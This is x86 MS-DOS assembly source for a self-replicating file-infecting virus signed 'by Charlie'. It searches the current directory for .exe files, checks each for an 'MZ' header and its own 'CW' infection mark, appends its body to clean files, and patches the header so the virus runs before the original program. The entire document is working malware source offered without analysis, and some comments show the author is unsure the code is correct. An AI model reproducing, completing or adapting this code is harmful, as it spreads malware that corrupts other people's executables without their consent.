; mark save in 2ah and if it is virus.exe in 6ch there is another mark
code segment
    assume cs: code
start:
    jmp short begin
    marks_ db "CW"
    fNAME db "VIRUS.EXE",0 ; as sign of virus
    by db "by Charlie",0
    tempmemory db 16 dup ("$")
begin:
    mov ax, cs
    mov ds, ax
    
    call virus

    cmp bp, 0		; bp = 0 means virus.exe, otherwise other file infected is running
    jne notOriVirus
    mov ax, 4c00h
    int 21h    

notOriVirus:

    lea si, [bp + offset tmpHead]
    lea di, [bp + offset head]
    mov cx, 70h

    ; copying real head to modifHead
    copying2:
	mov al, [si]
	mov [di], al
        inc si
        inc di
    	loop copying2

    push cs
    
    lea si, [bp + offset head]	; if not ori virus.exe, then continue running source file
    mov ax, word ptr [si + 14h]	; which means the real one before infected
    push ax			; take the data from real IP address before
    retf

virus proc near
    call printVirus
printVirus:
    pop bp ; offset
    sub bp, offset printVirus
    mov ah, 9
    lea dx, [bp + offset string]
    int 21h

    lea si, [bp + offset head]
    lea di, [bp + offset tmpHead]
    mov cx, 70h

    ; copying real head to tmpHead
    copying1:
	mov al, [si]
	mov [di], al
        inc si
        inc di
   	loop copying1

    mov ah, 1ah  		; set data transfer address
    lea dx, [bp + offset dta]
    int 21h

    mov ah, 4eh ; open first file
    lea dx, [bp + offset filename]
    xor cx, cx			; file attribute as read only
    int 21h

    jnc spreading
    ret				; no files to read

spreading proc

    lea dx, [bp + offset dta + 1eh] ; filename extracted address
    mov ax, 3d02h 		; open file read/write access
    int 21h

    mov bx, ax    		; file handle

    jnc readFile
    lea di, [bp + offset nextf] ; if can't open
    jmp di
	; jmp address is not correct it should be BP+offset nextf, how?


    readFile:    

    mov ax, 4200h 		; point file to start
    xor cx, cx
    xor dx, dx
    int 21h 
    
    mov ah, 3fh 		; read file, copy all header to head
    lea dx, [bp + offset head]	
    mov si, dx			; head address in memory
    mov cx, 70h 		; link.exe's head 60 bytes, so need a bigger one
    int 21h
    				; check if file is exe or infected

    lea di, [bp + offset MZs]   ; MZs
    mov ax, [di]
    cmp word ptr [si], ax
    je checkMark 		;  exe
    lea di, [bp + offset nextf]
    jmp di

    checkMark:    
    lea di, [bp + offset mark]
    mov ax, [di]
    cmp word ptr [si + 2ah], ax ; default is 0000 from 60h~200h
    jne infecting
    lea di, [bp + offset nextf]
    jmp di			; infected already


    infecting:
    				; change to infected
    				; in here use changing file, not deleting file
    				; change copy header first
    				; mark it
    continue1:
    		    		; need to be infected here
    				; jump to the end of file
    
    ; ****now change the ori header directly*****
    
    continue2:
    mov ax, 4202h		; point to end of file
    xor cx, cx
    xor dx, dx
    int 21h

    push ax 			; save last memory of IP to stack, mem of start virus
    				; calcuulate new IP
    sub ax, 200h		; point of end of file  - 200h (head in real file)
    mov cx, ax
    mov ax, [si + 16h]		; cs
    mov dx, 10h			; cs * 10h
    mul dx
    sub cx, ax			

    pop ax			; ax point to last memory of ori file for copy
    push cx			; save new IP to the stack

    mov ah, 40h
    lea dx, [bp + offset start] ; copying all virus
    lea cx, [bp + offset ending]
    sub cx, dx			; length of virus
    int 21h
    
    ; copying succeed

    mov ax, 4202h		; point to the end of file
    xor cx, cx
    xor dx, dx
    int 21h			; ax <-- last memory address of modified file

    mov cx, 200h		; 512 based on default
    div cx
    inc ax			; ensure non zero location, providing extra space for virus
    
    push ax			; save result in stack
    push dx			; save mod in stack

    lea si, [bp + offset head]
    lea di, [bp + offset modifHead]
    mov cx, 70h
    jmp copying

    ; copying real head to modifHead
    copying:
	mov al, [si]
	mov [di], al
        inc si
        inc di
    	loop copying

    lea si, [bp + offset head]
    lea di, [bp + offset modifHead]

    mov ax, word ptr [si + 14h]
    mov word ptr [di + 2eh], ax

    mov ax, word ptr [si + 16h]
    mov word ptr [di + 28h], ax

    pop dx
    mov word ptr [di + 2h], dx	; mod size
    pop dx
    mov word ptr [di + 4h], dx	; size / 200h
    pop dx
    mov word ptr [di + 14h], dx	; new IP for virus run first

    lea si, [bp + offset mark]
    mov ax, [si]
    mov [di + 2ah], ax		; mark it as infected

    lea si, [bp + offset head]

    mov ax, 4200h  		; point to the start of file
    xor cx, cx
    xor dx, dx			; offset 0h
    int 21h

    mov ah, 40h 		; rewrite the header
    lea di, [bp + offset modifHead]
    lea dx, [di]
    mov cx, 70h			; 70 bytes copy
    int 21h

    mov ax, 4200h		; point to the start of file
    xor cx, cx
    mov dx, 70h			; offset 70h
    int 21h

    mov ah, 40h			; save ori header to 2eh ~ (2eh + 30h)
    mov cx, 70h			; 70 bytes copy
    lea di, [bp + offset head]
    lea dx, [di]
    int 21h

spreading endp
        
nextf:

    mov ah, 3eh 		; close file
    int 21h

    mov ah, 4fh			; next file
    int 21h

    jc returning		; no more file
    lea di, [bp + offset spreading]
    jmp di			; still exist file, spreading

returning:
    ret

virus endp

datas:
string db "I am a virus",13,10,'$'
MZs db "MZ"
mark db "CW"
head db 70h dup(0) ; contain information for revive later in kill, ori head
modifHead db 70h dup(0) ; modified header to copy to modified file
tmpHead db 70h dup (0)
filename db "*.exe",0
dta db 02bh dup (0)

ending:
code ends
end start